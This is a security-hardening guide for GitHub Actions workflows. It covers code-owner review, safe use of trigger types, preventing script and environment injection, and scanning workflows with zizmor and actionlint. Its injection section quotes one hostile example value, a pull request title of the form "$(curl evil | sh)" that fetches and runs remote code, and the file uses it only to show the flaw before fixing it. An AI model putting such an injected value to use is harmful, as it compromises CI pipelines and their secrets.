---
description: Security hardening for GitHub Actions — protect workflow definitions with CODEOWNERS + rulesets, choose pull_request vs pull_request_target correctly, prevent injection from untrusted event data, scan every workflow change with zizmor (security) and actionlint (correctness), and keep untrusted code off self-hosted runners.
scope: universal
paths:
  - ".github/workflows/**"
  - ".github/actions/**"
  - ".github/CODEOWNERS"
  - ".github/zizmor.yml"
  - ".github/actionlint.yaml"
  - ".github/actionlint-matcher.json"
tags: [ci, github-actions, security, supply-chain]
source: [boards, irt-flight-manager]
---

# GitHub Actions workflow security

Apply every rule below when authoring or editing anything under `.github/`.
These complement the conventions in `github-actions.md` (SHA-pinning,
least-privilege permissions) and the org/repo settings in `actions-policy.md`.

## Protect the workflow definition itself

Anyone who can open a PR can edit a workflow file in that PR. Two layers stop a
malicious edit from running with privileges:

- **CODEOWNERS** — assign `/.github/`, `/.github/workflows/`, and
  `/.github/CODEOWNERS` itself to an admin team so any workflow change requires
  owner review via its own PR. Two gotchas:
  - The owning team must have **write** access to the repo, or GitHub silently
    ignores every line — no error, no warning, no requested reviewer. Verify:
    ```bash
    gh api repos/<org>/<repo>/teams --jq '.[] | .slug + " -> " + .permission'
    ```
  - The file is last-match-wins: keep the `CODEOWNERS` line last, or a broader
    pattern added below it silently takes over ownership of the file itself.

- **Branch protection / rulesets** — CODEOWNERS only *requests* the review;
  the ruleset is what *blocks* the merge. The active ruleset on the default
  branch must set `require_code_owner_review: true` and
  `require_last_push_approval: true` (without the latter, an approved PR can be
  changed and self-merged after a follow-up push). If the ruleset is owned at
  the org level, flip these in the org's ruleset settings — the change lands on
  every repo it covers. Confirm the live values before relying on the gate:
  ```bash
  gh api repos/<org>/<repo>/rulesets/<id> \
    --jq '.rules[] | select(.type=="pull_request") | .parameters'
  ```

- **Choose the trigger deliberately** — see below. The event decides *which
  copy* of the workflow runs and *what credentials* it gets.

## `pull_request` vs `pull_request_target` — pick by what the job does

These are NOT interchangeable. The difference is security-critical:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow def that runs | **from the PR head** (PR can modify it) | **from the base branch** (PR cannot modify it) |
| Secrets / write token on fork PRs | ❌ none, read-only token | ✅ full secrets + write token |
| Checking out & running PR code | safe | **DANGEROUS** |

- **Build / lint / test workflows that execute PR code** → keep
  `pull_request`. Fork PRs get a read-only token and **no secrets**, so a
  malicious PR editing the workflow cannot exfiltrate anything. This is the
  safe default — do **not** "upgrade" it to `pull_request_target`.
- **`pull_request_target` is only for jobs that must run with secrets/write
  and do NOT execute untrusted PR code** — labelling, triage, posting
  comments, size checks. The base-branch copy runs, so the PR can't tamper
  with it.
- **Never** combine `pull_request_target` with a checkout of the PR head
  followed by build/test/`run` of that code — that runs attacker code with
  your secrets. This is the single most exploited Actions misconfiguration.
- The fix for a *test* workflow that "could be modified in a PR" is
  CODEOWNERS + branch protection (above) + GitHub's *require approval for
  fork PR runs* setting (`actions-policy.md`) — **not** `pull_request_target`.

If a workflow genuinely must build untrusted PR code **and then** act with
secrets, use the **split pattern**: an unprivileged `pull_request` workflow
builds and uploads an artifact; a separate `workflow_run` workflow runs
privileged, downloads the artifact, and acts. Harden the privileged half:
treat the artifact as **untrusted** (extract to a temp dir, validate before
use, never pipe into `$GITHUB_ENV`/`$GITHUB_OUTPUT`), and filter on
`github.event.workflow_run.conclusion == 'success'` plus the expected branch.

If you must use `pull_request_target` with a head checkout: check out
`github.event.pull_request.head.sha` (immutable), **not** `head.ref` (a
mutable TOCTOU race), gate on a trusted-owner/actor check, and still never
`run:` the checked-out code.

Avoid `issue_comment` / ChatOps triggers as approval gates — they're
TOCTOU-prone and bypass PR review. Prefer a label gate pinned to a specific
commit SHA.

## Prevent injection from untrusted input

**Untrusted sources** (attacker-controlled in a fork PR): `github.event.*`
fields (PR/issue title, body, branch/ref name, author login, commit message),
`git` output (`git log`, `git diff-tree`), downloaded artifacts, and
third-party action outputs.

**Script injection** — never interpolate an untrusted value into `run:`:

```yaml
# ❌ injection — a PR titled "$(curl evil | sh)" executes it
- run: echo "${{ github.event.pull_request.title }}"

# ✅ pass through an env var, quote on use
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Environment / output injection** — writing untrusted content into
`$GITHUB_ENV` or `$GITHUB_OUTPUT` lets an attacker inject arbitrary env vars
(`LD_PRELOAD`, `PATH`) or clobber another step's outputs. Never echo untrusted
data into them; if unavoidable, validate against a strict allowlist first and
beware multiline payloads.

**Path injection** — don't build file paths from untrusted input without
validation (path traversal into the workspace or runner).

## Scan every workflow change with zizmor and actionlint

Manual review misses things. Two required layers run on every `.github/**`
change, and both **fail the job on findings**:

- **zizmor** (security, `zizmor.yml` template): unpinned actions,
  template/script injection, dangerous `pull_request_target`, excessive
  permissions, `secrets: inherit`, artifact/cache issues, self-hosted exposure.
- **actionlint** (correctness, `actionlint.yml` template): YAML and workflow
  schema validity, expression syntax, which contexts are available where,
  action input names, `needs`/`outputs` references, and shellcheck on every
  `run:` block.

They do not overlap, and a security audit is not a parser. A change that puts
`${{ runner.temp }}` in a job-level `env:` block is "secure", but the `runner`
context only exists inside steps, so GitHub cannot parse the file at all: the
workflow is dead on the default branch, every push silently runs nothing, and a
release can be tagged on the broken commit. zizmor and pre-commit hygiene both
pass. actionlint reports it in a second:

```
context "runner" is not allowed here. available contexts are "github", "inputs", "matrix", "needs", "secrets", "strategy", "vars"
```

### zizmor

- On private repos (no GHAS) set `advanced-security: false` **and**
  `annotations: true` — both are required for inline annotations; annotations
  default to off, leaving findings only in the raw log.
- Pin the action **and** its `version:` input; never track "latest".
- Never silence a finding to make CI pass — fix the workflow, or add a
  per-finding `# zizmor: ignore[rule]` comment with a written justification.
- Adopting zizmor on an existing repo? Baseline pre-existing findings in
  `.github/zizmor.yml` so the gate blocks *new* findings from day one — and
  treat that file as a **burn-down backlog, not an exemption list**: never add
  an entry to get a change through, and when you touch a listed workflow, fix
  its finding and delete the line. The list only shrinks.
- zizmor's online audits resolve every `uses:` via the GitHub API and treat an
  unreadable repo as **fatal**. If workflows reference actions in private
  repos, mint a read-only GitHub App token scoped to exactly those repos and
  pass it as the action's `token:`.

### actionlint

- Use the `actionlint.yml` template. It runs the `actionlint-py` PyPI wheel
  (which bundles the Go binary) with `pipx`, which `ubuntu-latest` ships: no
  Go toolchain, no Docker, and no extra third-party action to add to the
  allowlist in `actions-policy.md`. It injects the `shellcheck-py` wheel into
  the same venv so `run:` blocks are checked with the **pinned** shellcheck,
  not whatever the runner image ships (which trails by minor versions and
  would let a script pass locally and fail in CI, or the reverse).
- Pin `ACTIONLINT_VERSION` and `SHELLCHECK_VERSION`; never track latest. The
  actionlint-py version has **four** components, `<actionlint>.<package build>`
  (e.g. `1.7.12.25`), so a three-part `# renovate:` annotation regex cannot
  claim it. Track both with regex custom managers in `renovate.json` (one per
  package: a `depNameTemplate` overrides a captured `depName` group, so a
  single manager cannot serve two packages), grouped with the pre-commit rev
  so every layer lints with the same versions. Renovate's `pre-commit`
  manager is opt-in, so the snippet enables it; without that the rev never
  moves and the group silently drifts:

  ```json
  {
    "pre-commit": { "enabled": true },
    "customManagers": [
      {
        "customType": "regex",
        "description": "actionlint-py pin in the workflow env; grouped with the pre-commit rev by the actionlint packageRule.",
        "managerFilePatterns": ["/^\\.github/workflows/actionlint\\.yml$/"],
        "matchStrings": ["ACTIONLINT_VERSION[=:]\\s*(?<currentValue>\\d+\\.\\d+\\.\\d+\\.\\d+)"],
        "depNameTemplate": "actionlint-py",
        "datasourceTemplate": "pypi"
      },
      {
        "customType": "regex",
        "description": "shellcheck-py pin in the workflow env and as the pre-commit actionlint hook's additional dependency.",
        "managerFilePatterns": [
          "/^\\.github/workflows/actionlint\\.yml$/",
          "/^\\.pre-commit-config\\.yaml$/"
        ],
        "matchStrings": [
          "SHELLCHECK_VERSION[=:]\\s*(?<currentValue>\\d+(?:\\.\\d+)+)",
          "shellcheck-py==(?<currentValue>\\d+(?:\\.\\d+)+)"
        ],
        "depNameTemplate": "shellcheck-py",
        "datasourceTemplate": "pypi"
      }
    ],
    "packageRules": [
      {
        "description": "actionlint toolchain - one branch for the pre-commit rev and the actionlint-py and shellcheck-py pins so every layer lints with the same versions.",
        "groupName": "actionlint",
        "matchPackageNames": ["actionlint-py", "Mateusz-Grzelinski/actionlint-py", "shellcheck-py"]
      },
      {
        "description": "Four-part tag; the default semver-coerced versioning drops the fourth component, so build-only bumps are never offered.",
        "matchPackageNames": ["Mateusz-Grzelinski/actionlint-py"],
        "versioning": "loose"
      }
    ]
  }
  ```

  If Renovate automerges branches without a PR (`automergeType: branch`),
  the toolchain bump must be linted before it lands: add `renovate/**` to the
  workflow's `push.branches` (as a pre-commit workflow would) or gate the
  group behind dependency-dashboard approval. Otherwise a new actionlint
  release that adds findings elsewhere in the tree merges green and turns
  the `push: main` job red for every later workflow PR.

- Mirror both pins in pre-commit so developers see the same findings before
  they push. `shellcheck-py` gives them shellcheck without a system install:

  ```yaml
  - repo: https://github.com/Mateusz-Grzelinski/actionlint-py
    rev: v1.7.12.25
    hooks:
      - id: actionlint
        additional_dependencies: [shellcheck-py==0.11.0.1]
  ```

  If the repo runs an agent PostToolUse hook for zizmor, add a sibling for
  actionlint with the same shape: use the system binary if it matches the
  pin, else `uvx --from actionlint-py==<pin> actionlint`, else skip. Run it
  from the repo root with a relative path: actionlint resolves the config's
  `paths:` globs against the working directory, so an absolute path from
  elsewhere silently skips the ignores. Add the hook's path to the
  `actionlint-py` manager's `managerFilePatterns` so its pin moves with the
  others.
- Never silence a finding to make CI pass. A genuine false positive goes in
  `.github/actionlint.yaml` under `paths:` → `<glob>:` → `ignore:` as a
  commented regex; treat that file exactly like the zizmor baseline: a
  burn-down, never an exemption list. The one known case: actionlint (as of
  1.7.12) does not know the `$/` self-repository `uses:` syntax
  (rhysd/actionlint#711):

  ```yaml
  paths:
    .github/workflows/**/*.yml:
      ignore:
        # actionlint does not parse the `$/` self-repository `uses:` form yet (rhysd/actionlint#711)
        - 'specifying action "\$/.+" in invalid format because ref is missing'
  ```

## Self-hosted runners

Never run **public-repo or fork PR** workloads on a self-hosted runner —
untrusted code executes on a host you own and persists state between jobs. Use
ephemeral GitHub-hosted runners for those; reserve self-hosted runners for
trusted, internal-only workflows.

## Other defaults

- `persist-credentials: false` on `actions/checkout` unless the job pushes
  back (see `github-actions.md`).
- Gate privileged jobs behind a GitHub *Environment* with required reviewers
  when they touch production.
- If pushes to the default branch must always finish, key their concurrency
  group on `github.run_id` so only PR runs get cancelled:
  ```yaml
  concurrency:
    group: ${{ github.workflow }}-${{ github.event_name == 'push' && github.run_id || github.ref }}
    cancel-in-progress: true
  ```

## Pre-merge checklist for any workflow change

- [ ] Every `uses:` is a full SHA with a `# vX.Y.Z` comment (including internal reusable workflows)
- [ ] Trigger matches what the job does; no `pull_request_target` + checkout-and-run of PR head
- [ ] Top-level `permissions:` is read-only; per-job escalation is minimal
- [ ] No `secrets: inherit` — the called workflow gets a named list
- [ ] No untrusted input (`${{ github.event.* }}`, git output, artifacts) in `run:`, `$GITHUB_ENV`, or `$GITHUB_OUTPUT`
- [ ] Downloaded artifacts treated as untrusted (temp dir, validated)
- [ ] `persist-credentials: false` unless the job pushes back
- [ ] No untrusted PR workload on a self-hosted runner
- [ ] zizmor passes without new ignores or baseline entries
- [ ] actionlint passes without new ignores
